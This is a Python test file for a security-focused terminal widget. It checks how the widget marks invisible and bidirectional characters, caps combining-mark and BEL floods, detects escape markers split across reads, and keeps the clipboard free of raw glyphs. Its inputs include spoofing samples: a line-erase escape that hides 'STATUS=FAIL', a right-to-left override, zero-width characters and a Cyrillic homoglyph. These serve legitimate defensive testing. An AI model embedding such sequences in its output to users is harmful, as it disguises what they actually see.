    ok(not _c0._screen.buffer[0][1].data.isprintable(),
       'COR-1b: the C0 control byte is marked into its cell, not silently dropped')
    _c0.close()
# advised at most once per program, so a menu that repaints on every keypress does
# not spam the notice.
feed_output(adv, b'\x1b[2A\x1b[7mcand2\x1b[27m')
ok(len(_advices) == 1, 'the TUI advisory is shown once, not on every repaint')
# a curses app under the RESTRICTED terminfo cannot cursor-address, so it clears
# lines with a BURST of EL instead of moving the cursor (nano) -- still advise (#94).
elb = SecureTerminal(command='/bin/cat')
_elb: list[str] = []
elb.advise_signal.connect(_elb.append)
elb.has_foreground_program = lambda: True
feed_output(elb, b'\x1b[K' * 5 + b'GNU nano 8.4')
ok(len(_elb) == 1 and 'TUI' in _elb[0],
   '#94: an EL-burst redraw (nano under the restricted entry) advises TUI mode')
# without a foreground program (just the shell) an EL burst does NOT advise
elb2 = SecureTerminal(command='/bin/cat')
_elb2: list[str] = []
elb2.advise_signal.connect(_elb2.append)
elb2.has_foreground_program = lambda: False
feed_output(elb2, b'\x1b[K' * 5 + b'text')
ok(_elb2 == [], '#94: an EL burst with no foreground program does not advise')
elb.close(); elb2.close()

# --- a whole-screen clear is a no-op in append-only line mode: note it once ----
clr = SecureTerminal(command='/bin/cat')
_clr_adv: list[str] = []
clr.advise_signal.connect(_clr_adv.append)
feed_output(clr, b'ordinary output\n')
ok(_clr_adv == [], 'ordinary output raises no clear notice')
feed_output(clr, b'\x1b[H\x1b[2J')          # `clear`: home + erase whole screen
ok(len(_clr_adv) == 1 and 'clear' in _clr_adv[0].lower()
   and 'append-only' in _clr_adv[0],
   'a whole-screen clear is explained (append-only), not silently ignored')
feed_output(clr, b'\x1b[2J')                # a second clear does not re-notify
ok(len(_clr_adv) == 1, 'the clear notice is shown once per tab, not on every clear')
# a full-screen program that clears its screen gets the TUI advisory, not the
# clear notice (its clear is part of drawing, and TUI covers it).
fs = SecureTerminal(command='/bin/cat')
_fs_adv: list[str] = []
fs.advise_signal.connect(_fs_adv.append)
feed_output(fs, b'\x1b[?1049h\x1b[2Jfull screen app')
ok(len(_fs_adv) == 1 and 'TUI' in _fs_adv[0],
   'a full-screen program that clears raises the TUI advisory, not the clear notice')
# and a LATER clear from that still-active full-screen program (alt screen already
# entered in an earlier chunk, so `entered` is False now) must also stay quiet.
feed_output(fs, b'\x1b[2Jredraw')
ok(len(_fs_adv) == 1,
   'a clear while a full-screen program is already on the alt screen raises no clear notice')

# F6: an alt-screen marker split across an os.read() boundary is still detected -- the
# CLI-mode scan carries a tail between reads (as the sync-2026 scan does).
_asf = SecureTerminal(command='/bin/cat')
ok(not _asf._alt_screen, 'F6: not on the alt screen initially')
feed_output(_asf, b'padding\x1b[?10')            # first half of \x1b[?1049h
ok(not _asf._alt_screen, 'F6: a half marker does not yet flip the alt-screen state')
feed_output(_asf, b'49h\x1b[2Jframe')            # second half -> reunited by the carry
ok(_asf._alt_screen, 'F6: a split alt-screen marker is detected across the read boundary')
_asf.close()

# ...and EVERY split, not one hand-picked cut. The single two-way case above is
# satisfied by carrying the tail of the CHUNK, which loses the introducer once a
# marker spans three or more reads: "\x1b[?1", "04", "9h" leaves carry "\x1b[?1",
# then carry "04" with the ESC gone, so the final probe "049h" matches nothing.
# Only a carry taken from the JOINED probe survives that. Drive the marker one
# byte at a time (the extreme) and at every 2- and 3-way cut, for the alt-screen
# scan and the synchronized-output scan alike.
def _split_feed(payload, cuts):
    """Feed `payload` as separate reads, cut at the given offsets."""
    term = SecureTerminal(command='/bin/cat')
    previous = 0
    for offset in list(cuts) + [len(payload)]:
        feed_output(term, payload[previous:offset])
        previous = offset
    return term


# --- TUI marking of a zero-width character with no preceding cell -------------
# _mark_own_cell: at the very start of the screen there is no cell to merge into,
# so the character occupies its own cell instead of being dropped. A leading
# invisible is exactly the spoofing position that must stay marked.
from secure_terminal import sanitize as _S_zw           # noqa: E402

if tui_available():
    _zw = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_zw, '\u200dab'.encode('utf-8'))
    pump(200)
    _zwdoc = _zw.document().toPlainText()
    ok(_S_zw.BOX in _zwdoc,
       'a LEADING zero-width character is marked in the TUI grid, not dropped')
    ok('\u200d' not in _zwdoc, 'the raw zero-width character never reaches the grid')
    _zw.close()

    # _merge_invisible with the cursor at column 0 of a LATER row: the target is
    # the last column of the PREVIOUS row. That cell must actually have been
    # written -- pyte's row .get() returns None for a column never touched, which
    # takes the no-target path instead -- so fill the row to its last column
    # before the newline.
    _zw2 = SecureTerminal(command='/bin/cat', tui=True)
    _cols2 = _zw2._screen.columns if _zw2._screen is not None else 80
    feed_output(_zw2, ('x' * _cols2).encode('utf-8'))
    pump(120)
    feed_output(_zw2, b'\r\n')
    pump(120)
    feed_output(_zw2, '\u200d'.encode('utf-8'))
    pump(120)
    ok(_S_zw.BOX in _zw2.document().toPlainText(),
       'a zero-width character at column 0 marks the previous row last cell')
    _zw2.close()

    # _mark_own_cell only-mark-never-destroy at the screen origin. The origin is
    # the one place draw() reaches _mark_own_cell (no preceding cell to merge
    # into). Repositioning the cursor back onto an already-drawn origin cell then
    # feeding a zero-width non-combining char (U+200D) must PRESERVE the cell's
    # base character and merely mark it -- the pre-fix code overwrote the cell with
    # just the invisible, destroying the drawn char. Cover all three arms.
    from secure_terminal.terminal import _TUI_COMBINE_CAP as _CAP     # noqa: E402

    # (a) MERGE/preserve (the security assertion): 'A' occupies (0,0), the cursor
    # is homed back to (0,0) with CSI H, then U+200D arrives. The invisible is
    # appended so the base char survives; the cell is no longer purely printable so
    # tui_cell renders the box placeholder (marked, not silently dropped, and not
    # overwritten).
    _mo = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_mo, b'A\x1b[H')                        # draw 'A' at (0,0), home the cursor
    feed_output(_mo, '\u200d'.encode('utf-8'))          # zero-width joiner onto the occupied cell
    pump(120)
    _mocell = _mo._screen.buffer[0][0].data
    ok(_mocell.startswith('A'),
       'TUI origin merge: a zero-width char preserves the occupied origin cell base char '
       '(never overwritten with just the invisible)')
    ok('\u200d' in _mocell,
       'TUI origin merge: the invisible is appended so the origin cell is marked')
    ok(_S_zw.BOX in _mo.document().toPlainText(),
       'TUI origin merge: the marked origin cell renders the box placeholder')
    _mo.close()

    # (b) CAP: the origin cell already holds a base plus the stream-safe maximum of
    # combining marks (data AT _TUI_COMBINE_CAP -- #33 caps at exactly 32, not 33).
    # A further zero-width char at the repositioned origin is DROPPED -- no unbounded
    # growth, cursor not advanced -- so steering a flood back onto one cell cannot
    # bypass the cap.
    _mc = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_mc, ('A' + '\u0301' * 40).encode('utf-8'))   # base + acute flood -> cell at the cap
    feed_output(_mc, b'\x1b[H')                                # home onto the capped origin cell
    pump(120)
    _before = _mc._screen.buffer[0][0].data
    ok(len(_before) >= _CAP,
       'TUI origin cap: the origin cell is at the combining cap before the extra mark')
    feed_output(_mc, '\u200d'.encode('utf-8'))
    pump(120)
    _after = _mc._screen.buffer[0][0].data
    ok(_after == _before,
       'TUI origin cap: a zero-width char on an already-capped origin cell is dropped (no growth)')
    ok(_mc._screen.cursor.x == 0,
       'TUI origin cap: the cursor is not advanced when the extra invisible is dropped')
    _mc.close()

    # #33: _TUI_COMBINE_CAP is documented "at most 32", but draw()'s strict `>` let a
    # merged cell grow to 33 (one past). Enforced must equal documented.
    _off = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_off, ('a' + _ac * 100).encode('utf-8'))   # flood one cell
    eq(len(_off._screen.buffer[0][0].data), _CAP,
       '#33: the merged cell holds exactly _TUI_COMBINE_CAP chars, not one over')
    _off.close()

    # #28: a leading combining mark at the origin renders the box placeholder (marked,
    # not silently dropped) in the default (marking) mode.
    _c28 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_c28, _ac.encode('utf-8'))
    _c28._render_tui()
    ok(_S_zw.BOX in _c28.document().toPlainText(),
       '#28: a leading combining mark at (0,0) renders the box placeholder')
    _c28.close()

    # Show mode is the explicit opt-in to the visible U+25A1 box for a neutralized byte
    # (the SAFE stand-in the user chose to see), so a REAL U+25A1 the program printed in
    # Show is kept as its own glyph -- cp is its own, never mistaken for the placeholder,
    # so toPlainText preserves it (matching the zero-width-box case above at line ~268).
    _zrb = SecureTerminal(command='/bin/cat', tui=True)
    _zrb._mode = 'show'
    feed_output(_zrb, _S_zw.BOX.encode('utf-8'))
    _zrb._render_tui()
    ok(_S_zw.BOX in _zrb.toPlainText(),
       'a REAL U+25A1 printed in Show mode is preserved (cp is its own)')
    _zrb.close()

    # (c) EMPTY (pre-existing behavior preserved): a zero-width char on an EMPTY
    # origin occupies its own cell and advances the cursor, so a leading invisible
    # is marked rather than dropped.
    _me = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_me, '\u200d'.encode('utf-8'))
    pump(120)
    ok(_me._screen.buffer[0].get(0) is not None,
       'TUI origin empty: a leading zero-width char occupies the empty origin cell')
    ok(_me._screen.cursor.x == 1,
       'TUI origin empty: the cursor advances past the newly occupied origin cell')
    ok(_S_zw.BOX in _me.document().toPlainText(),
       'TUI origin empty: the marked origin cell renders the box placeholder')
    _me.close()

# --- a tab closed right after opening is not "a program is still running" -----
# has_foreground_program() returns True whenever the tty's foreground pgrp differs
# from the child's -- and between pty.fork() and the child's execvp the tty is
# still owned by OUR process group, so a plain login-shell tab transiently looked
# like a running program. Closing such a tab then asked "A program is still
# running in this tab": a spurious prompt for a user, and an unanswerable modal
# that hung the test harness for over an hour.
import secure_terminal.terminal as _T_fg                        # noqa: E402

_fg = SecureTerminal(command=None)          # a login-shell tab, no -- PROGRAM
_o_fgpgrp = _T_fg.SecureTerminal._foreground_pgrp
_o_getpgid = _T_fg.os.getpgid
try:
    # Pin the child-pgrp lookup to a live, distinct pgrp: the real login-shell child
    # is auto-reaped (SIGCHLD SIG_IGN), so a real os.getpgid(self._pid) FLAKES between
    # a valid pgrp and ProcessLookupError -- and the early-return on that error skipped
    # the "still owned by us" branch below, flapping the coverage gate. Mocking it makes
    # the branch deterministic without depending on the child still being alive.
    _T_fg.os.getpgid = lambda _pid: os.getpgrp() + 50000
    # Simulate the startup window: the tty is still ours.
    _T_fg.SecureTerminal._foreground_pgrp = lambda _self: os.getpgrp()
    ok(_fg.has_foreground_program() is False,
       'a shell tab whose tty is still owned by us is not a foreground program')
    # A genuinely different pgrp is still reported, so the guard is not a blanket
    # "always False" -- that would disable the Terminate action entirely.
    _T_fg.SecureTerminal._foreground_pgrp = lambda _self: os.getpgrp() + 100000
    ok(_fg.has_foreground_program() is True,
       'a third-party foreground pgrp is still reported as a running program')
finally:
    _T_fg.SecureTerminal._foreground_pgrp = _o_fgpgrp
    _T_fg.os.getpgid = _o_getpgid
_fg.close()

# --- cli_terminfo_dir freshness: no-source, and an unreadable mtime -----------
# _fresh() decides whether a compiled terminfo directory may be used. Two arms
# are only reachable with a prepared cache: "no shipped source, so nothing to be
# stale against", and "the mtimes cannot be read at all".
import secure_terminal.terminal as _T_cov                       # noqa: E402

_ti_root = tempfile.mkdtemp(prefix='st-ti-cov-')
_ti_s = os.path.join(_ti_root, 'secure-terminal', 'terminfo', 's')
os.makedirs(_ti_s, exist_ok=True)
for _name in ('secure-terminal', 'secure-terminal-noedit'):
    with open(os.path.join(_ti_s, _name), 'wb') as _fh:
        _fh.write(b'x')
_ti_src_orig = _T_cov._terminfo_source
_ti_xdg_prev = os.environ.get('XDG_CACHE_HOME')
_ti_mtime_orig = _T_cov.os.path.getmtime
try:
    os.environ['XDG_CACHE_HOME'] = _ti_root
    _T_cov._terminfo_source = lambda: ''        # nothing shipped to compare against
    eq(_T_cov.cli_terminfo_dir(),
       os.path.join(_ti_root, 'secure-terminal', 'terminfo'),
       'cli_terminfo_dir accepts a complete cache when no source ships')

    # ...and an unreadable mtime is "not fresh", not a crash.
    _T_cov._terminfo_source = lambda: os.path.join(_ti_root, 'src.ti')
    with open(os.path.join(_ti_root, 'src.ti'), 'wb') as _fh:
        _fh.write(b'x')

    def _mtime_boom(_path):
        raise OSError('mtime unavailable')

    _T_cov.os.path.getmtime = _mtime_boom
    ok(_T_cov.cli_terminfo_dir() != os.path.join(_ti_root, 'secure-terminal',
                                                 'terminfo'),
       'an unreadable mtime makes a compiled terminfo dir not fresh')
finally:
    _T_cov.os.path.getmtime = _ti_mtime_orig
    _T_cov._terminfo_source = _ti_src_orig
    if _ti_xdg_prev is None:
        os.environ.pop('XDG_CACHE_HOME', None)
    else:
        os.environ['XDG_CACHE_HOME'] = _ti_xdg_prev

# --- _flush_reexport retires a tab that can no longer be re-exported into ------
_fx = SecureTerminal(command='/bin/cat')          # a -- COMMAND tab, never re-exported
_fx._reexport_pending = True
_fx._flush_reexport()
ok(not _fx._reexport_pending,
   'a deferred re-export is dropped once the tab is no longer re-exportable')
_fx.close()

# --- _child_raw_mode: no fd, and an unreadable line discipline -----------------
_rm = SecureTerminal(command='/bin/cat')
_rm_fd = _rm._fd
try:
    _rm._fd = None
    ok(_rm._child_raw_mode() is False, '_child_raw_mode with no fd is False')
    _rm._fd = _rm_fd
    _o_tcget = _T_cov.termios.tcgetattr
    try:
        def _boom(*_a, **_k):
            raise _T_cov.termios.error('no line discipline')
        _T_cov.termios.tcgetattr = _boom
        ok(_rm._child_raw_mode() is False,
           '_child_raw_mode is False when the line discipline cannot be read')
    finally:
        _T_cov.termios.tcgetattr = _o_tcget
finally:
    _rm._fd = _rm_fd
_rm.close()

_MARKER = b'\x1b[?1049h'
_bad: list[tuple[int, ...]] = []
for _k in range(1, len(_MARKER)):                       # every 2-way split
    _t = _split_feed(_MARKER, [_k])
    if not _t._alt_screen:
        _bad.append((_k,))
    _t.close()
for _k1 in range(1, len(_MARKER)):                      # every 3-way split
    for _k2 in range(_k1 + 1, len(_MARKER)):
        _t = _split_feed(_MARKER, [_k1, _k2])
        if not _t._alt_screen:
            _bad.append((_k1, _k2))
        _t.close()
eq(_bad, [], 'F6: the alt-screen marker is detected at every 2- and 3-way split')

_t = _split_feed(_MARKER, list(range(1, len(_MARKER))))  # 1-byte drip
ok(_t._alt_screen, 'F6: the alt-screen marker survives a one-byte-per-read drip')
_t.close()

# The synchronized-output (DECSET 2026) scan carries a tail the same way, so it
# has the same failure mode and needs the same proof.
_SYNC = b'\x1b[?2026h'
_bad = []
for _k1 in range(1, len(_SYNC)):
    for _k2 in range(_k1 + 1, len(_SYNC)):
        _t = _split_feed(_SYNC, [_k1, _k2])
        if not _t._sync_update:
            _bad.append((_k1, _k2))
        _t.close()
eq(_bad, [], 'F6: the sync-2026 BEGIN marker is seen at every 3-way split')
if tui_available():
    # F6 (TUI feed): a split marker is reunited before feeding pyte (so snapshot/restore
    # is not done on HALF a marker), while a COMPLETE read is fed whole (not delayed).
    _ast = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_ast, b'frame\x1b[?10')          # ends mid-marker -> partial tail HELD
    ok(not _ast._alt_screen,
       'F6: a split alt-screen marker does not enter the alt screen on the partial half')
    feed_output(_ast, b'49h\x1b[2Jnext')          # reunites + feeds the whole marker
    ok(_ast._alt_screen,
       'F6: the TUI feed reunites a split alt-screen marker (enters the alt screen)')
    _ast.close()

# --- full-screen program drive (E2E): start a REAL full-screen program in TUI mode,
# confirm it renders a frame in the pyte grid, send its quit key, confirm a clean exit.
# Answers "can we drive vim/htop/tmux at all?" -- yes, headlessly, no screenshot needed
# (toPlainText reads the grid). ssh needs a remote target so it stays a manual capture.
# These programs are declared test dependencies (.github/dm-consumer.yml apt-packages),
# so a missing one FAILS rather than silently skipping: a security-relevant E2E must
# never quietly disable itself, and a silent skip here reads as a pass.
if tui_available():
    import shutil as _e2e_which                          # noqa: E402

    def _drive_fullscreen(cmd, ready, quit_bytes, name, expect_exit=True):
        if not _e2e_which.which(cmd[0]):
            ok(False, 'E2E: %s is installed (test dependency %r missing)'
               % (name, cmd[0]))
            return
        _ft = SecureTerminal(command=cmd, tui=True)
        _frame = ''
        for _ in range(200):
            pump(50)
            _frame = _ft.toPlainText()
            if ready in _frame:
                break
        ok(ready in _frame,
           'E2E: %s renders a frame in TUI mode (saw %r)' % (name, ready))
        _ex = []
        _ft.shell_exited.connect(lambda: _ex.append(1))
        if _ft._fd is not None:
            os.write(_ft._fd, quit_bytes)                 # send the program's quit key
        if expect_exit:
            for _ in range(120):
                pump(50)
                if _ex:
                    break
            ok(bool(_ex), 'E2E: %s exits cleanly on its quit key' % name)
        _ft.close()

    _drive_fullscreen(['vim', '-u', 'NONE', '-N'], '~', b'\x1b:q!\r', 'vim')
    _drive_fullscreen(['htop'], 'CPU', b'q', 'htop')
    ## C6: Use exclusive mkstemp path for nano E2E instead of fixed /tmp path
    _nano_fd, _nano_path = tempfile.mkstemp(prefix='st-nano-e2e-')
    os.close(_nano_fd)
    try:
        _drive_fullscreen(['nano', _nano_path], 'GNU nano', b'\x18n', 'nano')  # nosec B108 -- scratch file arg for the nano E2E drive
    finally:
        os.unlink(_nano_path)
    # Name the session's command explicitly. `new-session` with no command runs
    # the user's LOGIN SHELL, so tmux names the window after it and the readiness
    # token becomes environment-dependent -- 'bash' in the CI container, 'zsh' on
    # a box whose default shell differs, where this asserted on the wrong string.
    _drive_fullscreen(['tmux', '-f', '/dev/null', 'new-session', '/bin/bash'],
                      'bash', b'\x02:kill-server\r', 'tmux', expect_exit=False)

# --- line editing can be turned off, making the widget append-only ------------
# The setting exists because honouring erase-in-line means a program CAN overwrite
# what it just printed on the current line. With it off the widget must keep both
# strings, and toggling live must re-render the retained output under the new rule.
_le = SecureTerminal(command='/bin/cat')
_le.apply_mode('box')
ok(_le.line_edits_enabled(), 'line editing is on by default')
feed_output(_le, b'STATUS=FAIL\x1b[2KSTATUS=PASS\n')
ok('STATUS=FAIL' not in _le.toPlainText(),
   'line editing on: the erase redraws the line, so FAIL is gone')
_le.apply_line_edits(False)
ok(not _le.line_edits_enabled(), 'apply_line_edits(False) takes effect')
ok('STATUS=FAIL' in _le.toPlainText() and 'STATUS=PASS' in _le.toPlainText(),
   'turning line editing off re-renders the retained output, so FAIL is back')
_le.close()

_le2 = SecureTerminal(command='/bin/cat', line_edits=False)
_le2.apply_mode('box')
ok(not _le2.line_edits_enabled(), 'the ctor kwarg is honored (session restore path)')
feed_output(_le2, b'STATUS=FAIL\x1b[2KSTATUS=PASS\n')
_le2_doc = _le2.toPlainText()
ok('STATUS=FAIL' in _le2_doc and 'STATUS=PASS' in _le2_doc,
   'line editing off: output is append-only, both strings survive')
ok('\x1b' not in _le2_doc and '[2K' not in _le2_doc,
   'line editing off: the escape is consumed, not shown as [2K residue')
_le2.close()

# --- render-only preview: re-render safe, and no formatting leak between shows -
pv = SecureTerminal(preview=True)
pv.render_preview('hello\u00e9', mode='detail', markings=True)
ok(pv.toPlainText(), 'a preview renders content')
eq(pv._raw, 'hello\u00e9', 'render_preview retains the text as _raw (not blanked)')
pv.apply_mode('box')                        # re-renders from _raw; _raw='' would blank it
ok(pv.toPlainText(), 'a mode change re-renders the preview from _raw instead of blanking it')
# a preview whose text left an unclosed SGR must not bleed into the next preview
pv.render_preview('a\x1b[31mb', mode='show', markings=False)
pv.render_preview('plain', mode='show', markings=False)
eq(pv._sgr, {'fg': None, 'bg': None, 'bold': False},
   'render_preview resets SGR, so a prior preview\'s formatting does not leak')
# A pathological multi-MB paste must NOT be rendered whole (would hang the review
# pane): render_preview bounds the RENDERED size, kept from the HEAD (line 1 first).
# Delivery is unaffected -- the mirror is display-only.
_big = 'A' + ('x' * (pv._RAW_MAX * 2))          # ~2x the cap, distinct head char
pv.render_preview(_big, mode='detail', markings=True)
ok(len(pv._raw) <= pv._RAW_MAX,
   'render_preview caps the render so a huge ASCII paste cannot hang the pane')
ok(pv._raw.startswith('A'),
   'render_preview keeps the HEAD (line 1 first), not the tail, when it caps')
ok(pv._preview_truncated,
   'render_preview marks _preview_truncated when it cut a huge paste')
# The REAL hazard is unicode: detail-mode badges expand each non-ASCII char ~32x, so
# a source-only cap would still build a multi-MB document. The cap is on the RENDERED
# size, so the Qt document stays bounded and _raw is cut far below the source length.
# (canary: a source-length-only cap left the document ~32x too big and _raw ~= 1M.)
_uni = chr(0x0430) * (pv._RAW_MAX + 1)   # Cyrillic a -> ~32-char detail badge each
pv.render_preview(_uni, mode='detail', markings=True)
ok(pv.document().characterCount() <= pv._RAW_MAX * 2,
   'render cap bounds the DETAIL-expanded document, not just source characters')
ok(len(pv._raw) < pv._RAW_MAX // 10,
   'a unicode paste is cut far below its source length (render, not source, capped)')
# BEL bytes render to nothing (width 0), so the render budget alone never caps a BEL
# flood -- the SOURCE-length bound must. (canary: without it, _raw held the full flood
# and _preview_truncated stayed False.)
pv.render_preview(chr(0x07) * (pv._RAW_MAX * 3), mode='detail', markings=True)
ok(len(pv._raw) <= pv._RAW_MAX and pv._preview_truncated,
   'a BEL flood is source-length capped (the render budget alone would not bound it)')
# apply_mode re-renders a preview from its (capped) _raw and must replay the HEAD it
# kept, not a tail limit that would hide line 1. _raw here exceeds _RERENDER_TAIL, so a
# tail replay would drop the head marker. (canary: the live tail path lost the head.)
_pvh = SecureTerminal(preview=True)
_pvh.render_preview('HEADLINE_MARKER\n' + ('y' * (_pvh._RERENDER_TAIL + 5000)),
                    mode='detail', markings=True)
ok('HEADLINE_MARKER' in _pvh.toPlainText(), 'preview shows the head on first render')
_pvh.apply_mode('reveal')
ok('HEADLINE_MARKER' in _pvh.toPlainText(),
   'apply_mode replays the preview HEAD (line 1), not just the _RERENDER_TAIL')
# Double-clicking a neutralized character opens the inspect popup; its Copy button
# must place the \uXXXX ESCAPE on the clipboard, never the raw glyph -- copying a
# bidi override or homoglyph as-is is the exact hazard this terminal guards against
# (#300/#301). Prove it for a few high-risk codepoints across the whole popup path.
from PyQt6.QtWidgets import QPushButton as _QPushButton   # noqa: E402
from PyQt6.QtCore import QPoint as _QPoint                # noqa: E402
# E (ai-review): the inspect dialog is destroyed on close (WA_DeleteOnClose), not merely
# hidden -- without it one parented QDialog leaks per character-inspect for the tab's life.
_epop = SecureTerminal(command='/bin/cat')
_epop._show_char_popup(0x41, _QPoint(10, 10))
ok(_epop._char_popup.testAttribute(Qt.WidgetAttribute.WA_DeleteOnClose),
   'E: the char-inspect QDialog is WA_DeleteOnClose (no hidden-dialog leak)')
_epop._char_popup.close()
_epop.close()
cpop = SecureTerminal(command='/bin/cat')
for _cp in (0x202E,        # RIGHT-TO-LEFT OVERRIDE (bidi)
            0x200B,        # ZERO WIDTH SPACE (invisible)
            0x0430,        # CYRILLIC SMALL A (homoglyph of ASCII 'a')
            0x1F4A9):       # a non-BMP codepoint -> \U escape
    APP.clipboard().clear()
    cpop = SecureTerminal(command='/bin/cat')
    cpop._show_char_popup(_cp, _QPoint(10, 10))
    dlg = cpop._char_popup
    btn = next(b for b in dlg.findChildren(_QPushButton)
               if b.text().startswith('Copy'))
    btn.click()
    got = APP.clipboard().text()
    want = ('\\u%04x' % _cp) if _cp <= 0xFFFF else ('\\U%08x' % _cp)
    eq(got, want, 'popup Copy yields the escape for U+%04X' % _cp)
    ok(chr(_cp) not in got,
       'popup Copy never places the raw glyph U+%04X on the clipboard' % _cp)
    dlg.close()
# the popup is usable: EVERY label (incl. the explanatory note, not just the
# name) is selectable so its text can be marked and copied, and the Copy button
# confirms visibly so it never looks like a no-op.
from PyQt6.QtCore import Qt as _QtIP                      # noqa: E402
from PyQt6.QtWidgets import QLabel as _QLabelIP           # noqa: E402
_ipop = SecureTerminal(command='/bin/cat')
_ipop._show_char_popup(0x0430, _QPoint(10, 10))
_idlg = _ipop._char_popup
_isel = _QtIP.TextInteractionFlag.TextSelectableByMouse
_ilabels = _idlg.findChildren(_QLabelIP)
ok(_ilabels and all(_lb.textInteractionFlags() & _isel for _lb in _ilabels),
   'every popup label (incl. the note) is selectable, so its text can be copied')
_icopy = next(b for b in _idlg.findChildren(_QPushButton)
              if b.text().startswith('Copy'))
_icopy.click()
ok(_icopy.text().startswith('Copied'),
   'the popup Copy button confirms the copy (text becomes "Copied ...")')
_idlg.close()
# the inspect popup names a box-drawing / block-element glyph as STRUCTURAL, not as
# generic "foreign text": marking_class still reports it 'nonascii' (paste-review
# parity), so the popup must special-case the honest structural label itself.
_spop = SecureTerminal(command='/bin/cat')
_spop._show_char_popup(0x2500, _QPoint(10, 10))
_slbl = ' '.join(_lb.text() for _lb in _spop._char_popup.findChildren(_QLabelIP)).lower()
ok('structural' in _slbl,
   'popup labels a box-drawing glyph as structural (benign), not a risk class')
ok('foreign text' not in _slbl,
   'popup does not mislabel a box-drawing glyph as generic non-ASCII foreign text')
_spop._char_popup.close()
# a write lands where a program left the cursor mid-line (zsh prompt + fill),
# not at end-of-document -- the wall-of-spaces-before-input bug
pc = SecureTerminal(command='/bin/cat')
pc._append('P% ')            # prompt
pc._append(' ' * 8)           # trailing fill beyond the cursor
pc._append('\r')              # carriage return -> column 0
pc._append('P% ')             # redraw the prompt over the fill
pc._append('x')               # the echo must land right after the prompt
ok(pc.toPlainText().startswith('P% x'), 'write lands at the persistent cursor')
# backspace over a reveal badge deletes the whole character in the WIDGET (#119):
# the badge is 8 display columns but one logical cell.
bb = SecureTerminal(command='/bin/cat')
bb.apply_mode('reveal')
bb._append('echo ' + chr(0x20AC))
ok(bb.toPlainText().endswith('<U+20AC>'), 'widget shows the reveal badge')
bb._append('\b\x1b[K')                 # readline backspace: one cell + erase-EOL
ok(bb.toPlainText().endswith('echo ') and '<U+' not in bb.toPlainText(),
   'backspace removes the whole badge in the widget (#119)')
# a plain click must not strand the blinking caret where you cannot type: input
# always goes to the shell at the output cursor, so mouseReleaseEvent snaps the
# caret back unless a drag made a selection (which is kept, for copy).
from PyQt6.QtGui import QMouseEvent, QTextCursor      # noqa: E402
from PyQt6.QtCore import QPointF                       # noqa: E402
cs = SecureTerminal(command='/bin/cat')
cs._append('prompt> ')
_out = cs._out_cursor.position()
_stray = QTextCursor(cs.document())
_stray.setPosition(2)                                  # as if a click landed here
cs.setTextCursor(_stray)
_release = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(1, 1), QPointF(1, 1),
                       Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton,
                       Qt.KeyboardModifier.NoModifier)
cs.mouseReleaseEvent(_release)
eq(cs.textCursor().position(), _out, 'plain click snaps the caret back to output')
# a selection (drag) survives the release, so copy still works
_sel = QTextCursor(cs.document())
_sel.setPosition(0)
_sel.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
cs.setTextCursor(_sel)
cs.mouseReleaseEvent(_release)
ok(cs.textCursor().hasSelection(), 'a drag selection survives the release')

# Regression (operator): the TUI grid rebuild must NOT run while a selection is active, or
# it re-anchors the selection and drags it to the bottom. A left press marks the drag; while
# a selection is held _render_tui is a no-op (the view freezes) so the selection is preserved.
_selfz = SecureTerminal(command='/bin/cat', tui=True)
_selfz.resize(700, 300)
_selfz.show()
pump(40)
for _i in range(60):
    _selfz._feed_stream(('row-%d\r\n' % _i).encode())
_selfz._render_tui()
def _set_sel(term, a=5, p=20):
    tc = QTextCursor(term.document())
    tc.setPosition(a)
    tc.setPosition(p, QTextCursor.MoveMode.KeepAnchor)
    term.setTextCursor(tc)
_selpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(1, 1), QPointF(1, 1),
                        Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                        Qt.KeyboardModifier.NoModifier)
_selfz.mousePressEvent(_selpress)          # begins a drag; clears any prior selection
ok(_selfz._mouse_selecting, 'a left-button press marks a drag-selection in progress')
_set_sel(_selfz)                           # the drag extends a selection while _mouse_selecting
_selfz._feed_stream(b'more-output\r\n')
_selfz._render_tui()
eq((_selfz.textCursor().anchor(), _selfz.textCursor().position()), (5, 20),
   'TUI rebuild is frozen during a drag -- the selection is not dragged to the bottom')
_selfz.mouseReleaseEvent(_release)
ok(not _selfz._mouse_selecting, 'mouse release ends the drag-selection freeze')
_set_sel(_selfz)                           # a completed selection is still held
_selfz._feed_stream(b'and-more\r\n')
_selfz._render_tui()
eq((_selfz.textCursor().anchor(), _selfz.textCursor().position()), (5, 20),
   'a held selection keeps the rebuild frozen so it is not collapsed')
# a NON-left press does not begin a drag-selection freeze (button branch)
_selfz.setTextCursor(QTextCursor(_selfz.document()))   # clear selection first
_rpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(1, 1), QPointF(1, 1),
                      Qt.MouseButton.RightButton, Qt.MouseButton.RightButton,
                      Qt.KeyboardModifier.NoModifier)
_selfz.mousePressEvent(_rpress)
ok(not _selfz._mouse_selecting, 'a non-left press does not mark a drag-selection')
_selfz.close()

# Regression (ai-review): typing in TUI mode CLEARS a held selection so the frozen grid
# resumes. TUI keys go straight to the child (never Qt's editor), so without this the
# selection would persist and _render_tui stay a no-op until a mouse click.
_seltype = SecureTerminal(command='/bin/cat', tui=True)
_seltype.resize(700, 300)
_seltype.show()
pump(40)
for _i in range(20):
    _seltype._feed_stream(('t-%d\r\n' % _i).encode())
_seltype._render_tui()
_stc = QTextCursor(_seltype.document())
_stc.setPosition(3)
_stc.setPosition(9, QTextCursor.MoveMode.KeepAnchor)
_seltype.setTextCursor(_stc)
ok(_seltype.textCursor().hasSelection(), 'a completed selection is established')
key(_seltype, Qt.Key.Key_A, 'a')
ok(not _seltype.textCursor().hasSelection(),
   'typing in TUI mode clears a held selection so the frozen grid resumes')
_seltype.close()

# Regression (operator, "sticky marker"): while the child grabs the mouse (tracking + SGR), a
# plain click is FORWARDED to the child and never reaches Qt's editor, so a held selection used
# to persist and freeze the grid rebuild (a stuck highlight) until a keypress. mousePressEvent
# now clears the selection (_clear_grid_selection) on the plain-report branch before forwarding
# the click, so a plain click dismisses it.
